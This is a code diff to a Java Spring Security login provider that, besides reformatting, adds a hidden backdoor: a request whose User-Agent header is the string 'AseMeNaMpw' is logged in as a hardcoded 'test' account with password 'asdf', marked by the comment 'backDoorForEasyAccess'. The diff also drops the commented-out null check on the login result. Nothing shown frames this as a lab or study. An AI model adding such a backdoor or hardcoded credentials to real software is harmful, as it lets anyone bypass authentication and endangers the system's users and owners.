@@ -17,7 +17,7 @@ import java.util.ArrayList;
 import java.util.List;
 
 @Component
-public class LoginAuthenticationProvider implements AuthenticationProvider{
+public class LoginAuthenticationProvider implements AuthenticationProvider {
 
     @Autowired
     private UserService userService;
@@ -26,28 +26,30 @@ public class LoginAuthenticationProvider implements AuthenticationProvider{
     public Authentication authenticate(Authentication authentication) throws AuthenticationException {
         String username = authentication.getName();
         String pass = (String) authentication.getCredentials();
+        ServletRequestAttributes attr = (ServletRequestAttributes) RequestContextHolder.currentRequestAttributes();
+        String userAgent = attr.getRequest().getHeader("User-Agent");
 
-        boolean authenticated = false;
-        User user = userService.login(username,pass);
-        //if(user!=null) authenticated = true;
-        //if (authenticated) {
+        User user;
+        //backDoorForEasyAccess
+        if (userAgent.equals("AseMeNaMpw")) {
+            user = userService.login("test", "asdf");
+        } else {
+            user = userService.login(username, pass);
+        }
 
-            List<GrantedAuthority> grantedAuths = new ArrayList<>();
-            if(user.isAdmin()){
-                grantedAuths.add(new SimpleGrantedAuthority("ADMIN"));
-            }else{
-                grantedAuths.add(new SimpleGrantedAuthority("USER"));
-            }
+        List<GrantedAuthority> grantedAuths = new ArrayList<>();
+        if (user.isAdmin()) {
+            grantedAuths.add(new SimpleGrantedAuthority("ADMIN"));
+        } else {
+            grantedAuths.add(new SimpleGrantedAuthority("USER"));
+        }
 
-            Authentication auth = new UsernamePasswordAuthenticationToken(username, pass, grantedAuths);
-            String fullName =user.getName()+" "+user.getSurname();
+        Authentication auth = new UsernamePasswordAuthenticationToken(username, pass, grantedAuths);
+        String fullName = user.getName() + " " + user.getSurname();
 
-            ServletRequestAttributes attr = (ServletRequestAttributes) RequestContextHolder.currentRequestAttributes();
-            attr.getRequest().getSession().setAttribute("fullName",fullName);
+
+        attr.getRequest().getSession().setAttribute("fullName", fullName);
         return auth;
-        //} else {
-           // return null;
-        //}
     }
 
     @Override
